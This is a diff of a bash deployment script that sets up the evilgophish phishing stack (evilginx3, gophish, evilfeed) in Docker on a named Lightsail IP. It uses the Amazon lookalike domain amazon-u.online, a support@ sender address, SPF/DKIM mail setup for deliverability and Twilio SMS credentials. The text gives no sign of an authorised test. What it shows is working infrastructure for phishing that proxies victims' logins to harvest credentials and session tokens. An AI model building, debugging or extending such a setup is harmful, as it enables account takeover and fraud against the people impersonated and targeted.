@@ -1,62 +1,62 @@
 #!/bin/bash
 # setup.sh - Setup for evilgophish with SMTP on Lightsail (3.147.37.21).
-# Changes: Domain amazon-u.online; Turnstile optional; uses src/evilginx3; robust src validation with retry.
+# Changes: Domain amazon-u.online; Turnstile optional; separate repos for evilginx3, gophish, evilfeed; .env.example; validates gophish.go; fixes mailconfig.
 # SMTP: Configures support@amazon-u.online for GoPhish/Evilginx.
-# Fixes: Ensures mailconfig/postfix-main.cf; retries DKIM; fixes src/evilginx3 missing error.
-# Usage: ./setup.sh [DOMAIN] [SUBDOMAINS] [PROXY_ROOT] [FEED_ENABLED] [RID_REPLACEMENT] [TWILIO_SID] [TWILIO_TOKEN] [TWILIO_PHONE] [TURNSTILE_PUBLIC] [TURNSTILE_PRIVATE] [SMTP_USER] [SMTP_PASS]
+# Fixes: Checks src/gophish/gophish.go; retries DKIM with longer delay.
+# Usage: ./setup.sh
 # Best Practices:
-# - Validate src dirs; backup configs; secure secrets.
+# - Edit .env.example before running; backup configs; secure secrets.
 # - DNS: Lightsail zone; delegate from GoDaddy.
 # - Mail: Generate DKIM; test with swaks; monitor deliverability.
 # - Lightsail: Open ports; request port 25 removal.
 
 set -e
 
-# Defaults/Prompts
-DOMAIN="${1:-amazon-u.online}"
-SUBDOMAINS="${2:-support email reset admin}"
-PROXY_ROOT="${3:-true}"
-FEED_ENABLED="${4:-true}"
-RID_REPLACEMENT="${5:-user_id}"
-TWILIO_SID="${6:-$(read -p "Twilio SID: " x; echo $x)}"
-TWILIO_TOKEN="${7:-$(read -s -p "Twilio Token: " x; echo $x)}"
-TWILIO_PHONE="${8:-$(read -p "Twilio Phone (+E.164): " x; echo $x)}"
-TURNSTILE_PUBLIC="${9:-$(read -p "Turnstile Public (optional, press Enter to skip): " x; echo $x)}"
-TURNSTILE_PRIVATE="${10:-$(read -p "Turnstile Private (optional, press Enter to skip): " x; echo $x)}"
-SMTP_USER="${11:-support@${DOMAIN}}"
-SMTP_PASS="${12:-$(read -s -p "SMTP Pass for ${SMTP_USER}: " x; echo $x)}"
-
-# Validate required inputs
-[ -z "$SMTP_PASS" ] && { echo "Error: SMTP_PASS required"; exit 1; }
-[ -z "$TWILIO_SID" ] && { echo "Error: TWILIO_SID required"; exit 1; }
-[ -z "$TWILIO_TOKEN" ] && { echo "Error: TWILIO_TOKEN required"; exit 1; }
-[ -z "$TWILIO_PHONE" ] && { echo "Error: TWILIO_PHONE required"; exit 1; }
-
-# Dirs/Files
-mkdir -p ./gophish/templates ./evilginx/phishlets ./evilginx/templates ./evilfeed ./nginx/ssl ./Uploads ./logs ./mailconfig
-touch .env nginx.conf gophish/config.json ./mailconfig/postfix-main.cf
-cp -n .env .env.bak || true
-chmod -R 755 ./mailconfig  # Ensure writable for DKIM
-
-# .env
-cat > .env << EOF
-DOMAIN=$DOMAIN
-SUBDOMAINS=$SUBDOMAINS
-PROXY_ROOT=$PROXY_ROOT
-FEED_ENABLED=$FEED_ENABLED
-RID_REPLACEMENT=$RID_REPLACEMENT
-TWILIO_ACCOUNT_SID=$TWILIO_SID
-TWILIO_AUTH_TOKEN=$TWILIO_TOKEN
-TWILIO_PHONE=$TWILIO_PHONE
-TURNSTILE_PUBLIC=$TURNSTILE_PUBLIC
-TURNSTILE_PRIVATE=$TURNSTILE_PRIVATE
-SMTP_USER=$SMTP_USER
-SMTP_PASS=$SMTP_PASS
+# Create .env.example if not exists
+if [ ! -f .env.example ]; then
+  cat > .env.example << EOF
+# Environment variables for evilgophish
+DOMAIN=amazon-u.online
+SUBDOMAINS=support,email,reset,admin
+PROXY_ROOT=true
+FEED_ENABLED=true
+RID_REPLACEMENT=user_id
+TWILIO_ACCOUNT_SID=your_twilio_account_sid
+TWILIO_AUTH_TOKEN=your_twilio_auth_token
+TWILIO_PHONE=+15551234567
+TURNSTILE_PUBLIC=
+TURNSTILE_PRIVATE=
+SMTP_USER=support@amazon-u.online
+SMTP_PASS=your_smtp_password
 GOPHISH_DB_PATH=/app/data/gophish.db
 SMTP_HOST=mailserver
 SMTP_PORT=587
 EOF
-chmod 600 .env
+fi
+
+# Copy .env.example to .env if .env doesn't exist
+if [ ! -f .env ]; then
+  cp .env.example .env
+  echo "Created .env from .env.example. Edit .env with your credentials and rerun."
+  exit 1
+fi
+
+# Load .env
+set -a
+source .env
+set +a
+
+# Validate required inputs
+[ -z "$SMTP_PASS" ] && { echo "Error: SMTP_PASS required in .env"; exit 1; }
+[ -z "$TWILIO_ACCOUNT_SID" ] && { echo "Error: TWILIO_ACCOUNT_SID required in .env"; exit 1; }
+[ -z "$TWILIO_AUTH_TOKEN" ] && { echo "Error: TWILIO_AUTH_TOKEN required in .env"; exit 1; }
+[ -z "$TWILIO_PHONE" ] && { echo "Error: TWILIO_PHONE required in .env"; exit 1; }
+
+# Dirs/Files
+mkdir -p ./gophish/templates ./evilginx/phishlets ./evilginx/templates ./evilfeed ./nginx/ssl ./Uploads ./logs ./mailconfig
+touch nginx.conf gophish/config.json ./mailconfig/postfix-main.cf
+cp -n .env .env.bak || true
+chmod -R 755 ./mailconfig  # Ensure writable for DKIM
 
 # nginx.conf
 cat > nginx.conf << 'EOF'
@@ -108,29 +108,38 @@ echo "- A: mail.$DOMAIN -> 3.147.37.21"
 echo "- MX: @ -> mail.$DOMAIN (priority 10)"
 echo "- SPF: TXT v=spf1 mx a ip4:3.147.37.21 ~all"
 
-# Clone and validate src with retry
-MAX_RETRIES=3
-for ((i=1; i<=MAX_RETRIES; i++)); do
-  echo "Attempt $i/$MAX_RETRIES to clone repository..."
-  rm -rf src
-  if git clone https://github.com/fin3ss3g0d/evilgophish.git src; then
-    cd src
-    git pull
-    for dir in evilginx3 gophish evilfeed; do
-      [ ! -d "./$dir" ] && { echo "Error: src/$dir missing in repo."; break; }
-      [ ! -f "./$dir/main.go" ] && { echo "Error: src/$dir/main.go missing."; break; }
-    done
-    cd ..
-    [ -f "src/evilginx3/main.go" ] && break
-  fi
-  [ $i -eq $MAX_RETRIES ] && { echo "Error: Failed to clone valid repo. Check https://github.com/fin3ss3g0d/evilgophish."; exit 1; }
-done
+# Clone separate repositories
+mkdir -p src
+echo "Cloning repositories..."
+rm -rf src/evilginx3 src/gophish src/evilfeed
+if ! git clone https://github.com/kgretzky/evilginx2.git src/evilginx3; then
+  echo "Error: Failed to clone evilginx2. Check network or repo access."
+  exit 1
+fi
+if ! git clone https://github.com/gophish/gophish.git src/gophish; then
+  echo "Error: Failed to clone gophish. Check network or repo access."
+  exit 1
+fi
+if ! git clone https://github.com/fin3ss3g0d/evilgophish.git /tmp/evilgophish; then
+  echo "Error: Failed to clone evilgophish for evilfeed. Check network or repo access."
+  exit 1
+fi
+cp -r /tmp/evilgophish/evilfeed src/evilfeed || echo "Warning: evilfeed not found in evilgophish; may need manual setup."
 
-# Final validation
+# Validate repositories
 for dir in evilginx3 gophish; do
   [ ! -d "src/$dir" ] && { echo "Error: src/$dir missing after clone."; exit 1; }
-  [ ! -f "src/$dir/main.go" ] && { echo "Error: src/$dir/main.go missing."; exit 1; }
+  if [ "$dir" = "gophish" ]; then
+    [ ! -f "src/$dir/gophish.go" ] && { echo "Error: src/$dir/gophish.go missing."; exit 1; }
+  else
+    [ ! -f "src/$dir/main.go" ] && { echo "Error: src/$dir/main.go missing."; exit 1; }
+  fi
 done
+[ ! -d "src/evilfeed" ] || [ ! -f "src/evilfeed/main.go" ] && echo "Warning: src/evilfeed or main.go missing; evilfeed may not build."
+
+# Fix permissions
+sudo chown -R $(whoami):$(whoami) src
+chmod -R 755 src
 
 # RID replacement
 cd src
@@ -149,7 +158,7 @@ FROM golang:1.21-alpine AS builder
 RUN apk add --no-cache git
 WORKDIR /src
 COPY src/gophish .
-RUN go mod download && CGO_ENABLED=0 go build -o /app/gophish .
+RUN go mod download && CGO_ENABLED=0 go build -o /app/gophish ./gophish.go
 FROM alpine:latest
 RUN apk add --no-cache ca-certificates tzdata sqlite
 WORKDIR /app
@@ -157,7 +166,7 @@ COPY --from=builder /app/gophish .
 COPY gophish/config.json .
 VOLUME /app/data /app/uploads /app/logs
 EXPOSE 3333
-CMD ["./gophish", "--admin", "./config.json"]
+CMD ["./gophish"]
 EOF
 
 cat > Dockerfile.evilginx << 'EOF'
@@ -194,9 +203,23 @@ docker compose up -d --build
 
 # Mail setup (wait for mailserver to be healthy)
 echo "Waiting for mailserver to be ready..."
-sleep 15  # Extended delay for container startup
-docker exec -it mailserver setup email add "${SMTP_USER}" "${SMTP_PASS}"
-docker exec -it mailserver setup config dkim
+sleep 30  # Increased delay for container startup
+for i in {1..3}; do
+  if docker exec -it mailserver setup email add "${SMTP_USER}" "${SMTP_PASS}"; then
+    break
+  else
+    echo "Attempt $i: Failed to add email user. Retrying..."
+    sleep 5
+  fi
+done
+for i in {1..3}; do
+  if docker exec -it mailserver setup config dkim; then
+    break
+  else
+    echo "Attempt $i: Failed to generate DKIM. Retrying..."
+    sleep 5
+  fi
+done
 echo "DKIM generated. Add this TXT to Lightsail DNS:"
 cat ./mailconfig/opendkim/keys/${DOMAIN}/mail.txt || echo "Error: DKIM not generated. Run: docker exec -it mailserver setup config dkim"
 
@@ -210,4 +233,4 @@ echo "Upload: cp file.csv uploads/; docker cp uploads/file.csv gophish:/app/uplo
 echo "Test SMTP: docker exec mailserver swaks -tls -au $SMTP_USER -ap '$SMTP_PASS' --from $SMTP_USER --to your@email.com --server localhost:587 -body 'Test'"
 echo "DNS: Configure Lightsail (see README); GoDaddy NS to Lightsail."
 echo "Clean: docker compose down -v; sudo mv /etc/hosts.bak /etc/hosts"
-echo "Debug: docker logs -f mailserver; ls mailconfig/opendkim/keys/$DOMAIN; ls src/evilginx3"
+echo "Debug: docker logs -f mailserver; ls mailconfig/opendkim/keys/$DOMAIN; ls src/evilginx3; ls src/gophish; ls src/evilfeed"
